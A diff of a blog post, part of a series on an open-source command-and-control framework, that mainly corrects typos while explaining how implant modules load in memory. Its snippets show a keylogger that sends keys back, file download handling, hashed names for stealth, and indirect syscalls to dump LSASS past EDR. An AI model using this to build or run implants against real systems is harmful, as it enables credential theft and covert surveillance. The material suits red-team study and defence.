@@ -1,4 +1,16 @@
-# Part 4 — Modules
+---
+layout: post
+article: true
+title: "Building a Modern C2 - Part 4: Modules"
+date: 2025-10-24
+category: c2
+series: "Building a Modern C2"
+tags: [c2, modules, memorymodule, beacon, stealth, templates]
+description: "How Exploration C2 modules are loaded, executed, unloaded, and shared between TeamServer and beacon implementations."
+permalink: /BuildingAModernC2/Part4Modules.html
+---
+
+# Part 4 - Modules
 
 This is **Part 4** of a series on **ExplorationC2**, a modular Command-and-Control framework I maintain at [https://github.com/maxDcb/C2TeamServer](https://github.com/maxDcb/C2TeamServer). In this post, I describe the **Modules**.
 
@@ -6,9 +18,9 @@ This is **Part 4** of a series on **ExplorationC2**, a modular Command-and-Contr
 
 ## What Are Modules in ExplorationC2?
 
-Modules in ExplorationC2 are **dynamically loadable components** that extend the functionality of the beacon without requiring changes to its core. They are delivered over the C2 channel and executed directly in memory using the [MemoryModule](https://github.com/maxDcb/MemoryModule) utility and a linux [simpler implementation](https://github.com/maxDcb/C2LinuxImplant/tree/master/libs/libMemoryModuleDumy). This approach allows for a **modular, extensible, and lightweight** architecture.  
+Modules in ExplorationC2 are **dynamically loadable components** that extend the functionality of the beacon without requiring changes to its core. They are delivered over the C2 channel and executed directly in memory using the [MemoryModule](https://github.com/maxDcb/MemoryModule) utility and a Linux [simpler implementation](https://github.com/maxDcb/C2LinuxImplant/tree/master/libs/libMemoryModuleDumy). This approach allows for a **modular, extensible, and lightweight** architecture.
 
-Every module as a double implementation for linux and windows, if applicable to the task.
+Every module has a dual implementation for Linux and Windows, if applicable to the task.
 
 ---
 
@@ -27,13 +39,13 @@ This design aligns with the principles of modular software architecture, where s
 
 ## How Modules Work
 
-Modules are implemented as shared libraries (DLLs on Window, SO on linux) and are loaded into the beacon's process space using the MemoryModule utility. The core beacon communicates with modules through a standardized set of class members, allowing for consistent interaction regardless of the module's specific function.
+Modules are implemented as shared libraries (DLLs on Windows, SOs on Linux) and are loaded into the beacon's process space using the MemoryModule utility. The core beacon communicates with modules through a standardized set of class members, allowing for consistent interaction regardless of the module's specific function.
 
 Here’s an in-depth look at how the **modules** work in this framework:
 
 ### 1. **TeamServer Module**
 
-* **TeamServer Modules**: They are loaded at the start of the TeamServer, these are **.so files** (Linux shared objects).
+* **TeamServer Modules**: They are loaded when the TeamServer starts; these are **.so files** (Linux shared objects).
 
 ```c++
  // TeamServer module loading
@@ -67,11 +79,11 @@ try
 TeamServer modules are compiled with specific functionalities:
 
 ```c++
-// Compute hash of moduleName at compile time, so the moduleName string don't show in the binary of the beacon version, while it is present and used in the TeamServer version
+// Compute hash of moduleName at compile time, so the moduleName string doesn't show in the binary of the beacon version, while it is present and used in the TeamServer version
 constexpr std::string_view moduleName = "cat";
 constexpr unsigned long long moduleHash = djb2(moduleName);
 
-// TeamServer contain the moduleName, where the beacon implementation only get the hash
+// TeamServer contains the moduleName, while the beacon implementation only gets the hash
 Cat::Cat()
 #ifdef BUILD_TEAMSERVER
     : ModuleCmd(std::string(moduleName), moduleHash)
@@ -98,7 +110,7 @@ std::string Cat::getInfo()
 // Message init routine is only present on the TeamServer implementation
 int Cat::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 {
-#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) 
+#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS)
     if (splitedCmd.size() >= 2 )
     {
         ...
@@ -132,31 +144,31 @@ bool Beacon::handleLoadModuleInstruction(C2Message& c2Message, C2Message& c2RetM
     HMEMORYMODULE handle = NULL;
     handle = MemoryLoadLibrary((char*)buffer.data(), buffer.size());
 
-    // Search for the rentry point that point to a function meant to trigger the constructor (only function exposed)
+    // Search for the entry point that points to a function meant to trigger the constructor (only function exposed)
     constructProc construct;
     construct = (constructProc)MemoryGetProcAddress(handle, reinterpret_cast<LPCSTR>(0x01));
 
-    // Call the constructor and store it for futur use
+    // Call the constructor and store it for future use
     ModuleCmd* moduleCmd = construct();
     m_moduleCmd.push_back(std::move(moduleCmd_));
     ...
 }
 ```
 
-Exemple of the exported constructor function:
+Example of the exported constructor function:
 
 
 ```c++
 #ifdef _WIN32
 
-extern "C" __declspec(dllexport) Cat* CatConstructor() 
+extern "C" __declspec(dllexport) Cat* CatConstructor()
 {
     return new Cat();
 }
 
 #else
 
-extern "C" __attribute__((visibility("default"))) Cat* CatConstructor() 
+extern "C" __attribute__((visibility("default"))) Cat* CatConstructor()
 {
     return new Cat();
 }
@@ -166,13 +178,13 @@ extern "C" __attribute__((visibility("default"))) Cat* CatConstructor()
 
 ### 3. **TeamServer Interaction**
 
-After the Beacon successfully loads the module, the **TeamServer** uses its own **implementation** of the module to **craft a message** meant to be processed by the Beacon’s module counterpart. This message might contain instructions and various data.   
+After the Beacon successfully loads the module, the **TeamServer** uses its own **implementation** of the module to **craft a message** meant to be processed by the Beacon’s module counterpart. This message might contain instructions and various data.
 
 ```c++
 // Message init routine is only present on the TeamServer implementation
 int Cat::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 {
-#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) 
+#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS)
     if (splitedCmd.size() >= 2 )
     {
         ...
@@ -189,7 +201,7 @@ int Cat::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
     return 0;
 }
 
-#define ERROR_OPEN_FILE 1 
+#define ERROR_OPEN_FILE 1
 
 // Processing, expecting a message crafted using Cat::init
 int Cat::process(C2Message &c2Message, C2Message &c2RetMessage)
@@ -220,10 +232,10 @@ int Cat::errorCodeToMsg(const C2Message &c2RetMessage, std::string& errorMsg)
 }
 ```
 
-The TeamServer implementation contain strings and error message, as well as the name of the module that are absent of the Beacon's module implementation, for stealth purpuse.
+The TeamServer implementation contains strings and error messages, as well as the name of the module, that are absent from the Beacon's module implementation for stealth purposes.
 
 ```bash
-> strings ./TeamServerModules/libCat.so  | grep -b3 "Failed: Couldn't open file" -i 
+> strings ./TeamServerModules/libCat.so  | grep -b3 "Failed: Couldn't open file" -i
 2720-|$pH
 2725-|$pL
 2730-L;l$H
@@ -239,21 +251,21 @@ The TeamServer implementation contain strings and error message, as well as the 
 ### 4. **Beacon Module Execution**
 
 Upon receiving the message, the Beacon:
-* **processes the message** and dispatch it to the right module 
+* **processes the message** and dispatches it to the right module
 * The module if loaded **executes the requested task**
 * After the task is completed, the module generates a response message, which contains:
-  * The **Task results** 
+  * The **Task results**
   * Or the **error code**
 
-Some module can run a thread, launch a new process.
+Some modules can run threads or launch new processes.
 
 ### 5. **Module Features**
 
-#### Methodes
+#### Methods
 
 Several features help manage module execution and extend the functionality:
 
-* **`followUp`**: Modules can schedule follow-up actions, creating a chain of operations. This function is call TeamServer side. It is use for example in the download module, to create the downloaded file on the TeamServer machine at reception of a sucessfull download module message.
+* **`followUp`**: Modules can schedule follow-up actions, creating a chain of operations. This function is called TeamServer-side. It is used, for example, in the download module to create the downloaded file on the TeamServer machine when a successful download module message is received.
 
 ```c++
 // followUp executed TeamServer side at reception of C2Message from download module
@@ -270,27 +282,27 @@ int Download::followUp(const C2Message &c2RetMessage)
         const std::string buffer = c2RetMessage.data();
         output << buffer;
         output.close();
-        
+
     }
 
     return 0;
 }
 ```
 
-* **`errorCodeToMsg`**: Internal error codes are mapped to **human-readable error messages**, ensuring that the operator can easily understand any issues that occured during module execution. This feature ensure that the beacon implmentation doesn't leak information about it's functioning without loosing **operational clarity**.
+* **`errorCodeToMsg`**: Internal error codes are mapped to **human-readable error messages**, ensuring that the operator can easily understand any issues that occurred during module execution. This feature ensures that the beacon implementation doesn't leak information about its functioning without losing **operational clarity**.
 
-* **`recurringExec`**: Some modules are designed for **periodic execution**. The `recurringExec` feature allows these modules to run at **regular intervals** without operator intervention. This is useful for ongoing tasks such as **data collection**, **persistent monitoring**, or **background operations**. It is use for example in the keylogger module, to retrive logged keys:
+* **`recurringExec`**: Some modules are designed for **periodic execution**. The `recurringExec` feature allows these modules to run at **regular intervals** without operator intervention. This is useful for ongoing tasks such as **data collection**, **persistent monitoring**, or **background operations**. It is used, for example, in the keylogger module to retrieve logged keys:
 
 ```c++
 // recurringExec executed at each beacon wake up
-int KeyLogger::recurringExec(C2Message& c2RetMessage) 
+int KeyLogger::recurringExec(C2Message& c2RetMessage)
 {
     std::string output;
     dumpKeys(output);
 
     c2RetMessage.set_instruction(std::to_string(getHash()));
     c2RetMessage.set_data(output);
-    
+
     return 1;
 }
 
@@ -302,13 +314,13 @@ int KeyLogger::followUp(const C2Message &c2RetMessage)
 }
 ```
 
-These features allow for **customizable** and **automated** operations within ExplorationC2.  
+These features allow for **customizable** and **automated** operations within ExplorationC2.
 
 #### Stealth
 
-The module base line: `C2Core/modules/ModuleCmd` include some helper implementation like Hardware breakpoint and indirect syscall (inspired by [SysWhispers3](https://github.com/klezVirus/SysWhispers3)) as well as diverse utilitary functions. 
+The module baseline, `C2Core/modules/ModuleCmd`, includes helper implementations like hardware breakpoints and indirect syscalls (inspired by [SysWhispers3](https://github.com/klezVirus/SysWhispers3)) as well as various utility functions.
 
-It help the development process for stealthy modules like the [MiniDump](https://github.com/maxDcb/C2Core/blob/master/modules/MiniDump/MiniDump.cpp) one, capable to bypassing advance EDR for LSASS dumping.
+It helps the development process for stealthy modules like [MiniDump](https://github.com/maxDcb/C2Core/blob/master/modules/MiniDump/MiniDump.cpp), which is capable of bypassing advanced EDR controls for LSASS dumping.
 
 ```c++
 #include <syscall.hpp>
@@ -322,7 +334,7 @@ int MiniDump::process(C2Message &c2Message, C2Message &c2RetMessage)
     client_id.UniqueProcess = (HANDLE)dwPid;
     client_id.UniqueThread = 0;
     OBJECT_ATTRIBUTES objAttr = {0};
-    // Indirect syscall implementation for NtOpenProcess 
+    // Indirect syscall implementation for NtOpenProcess
     Sw3NtOpenProcess_(&lsassHandle, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &objAttr, &client_id);
 
     // Standard implementation of OpenProcess
@@ -337,7 +349,7 @@ int MiniDump::process(C2Message &c2Message, C2Message &c2RetMessage)
 
 ### 6. **Module Unloading**
 
-After the module has completed its task, it can be **unloaded from memory**. This function can be usfull if modification are needed on the module to achive the task.
+After the module has completed its task, it can be **unloaded from memory**. This function can be useful if modifications are needed on the module to achieve the task.
 
 ---
 
@@ -348,8 +360,8 @@ To facilitate the creation of new modules, a [ModuleTemplate](https://github.com
 * A basic structure for the module.
 * Sample code demonstrating how to handle incoming messages.
 
-By using this template, developers can quickly create new modules that work with the framework's standards and integrate seamlessly with the existing system.  
-It is also usfull for AI generated modules, as agents like codex work best with Template. SOme of the modules like the [whoami](https://github.com/maxDcb/C2Core/blob/master/modules/Whoami/Whoami.cpp) where generated by codex.  
+By using this template, developers can quickly create new modules that work with the framework's standards and integrate seamlessly with the existing system.
+It is also useful for AI-generated modules, as agents like Codex work best with templates. Some modules, like [whoami](https://github.com/maxDcb/C2Core/blob/master/modules/Whoami/Whoami.cpp), were generated by Codex.
 
 ---
 
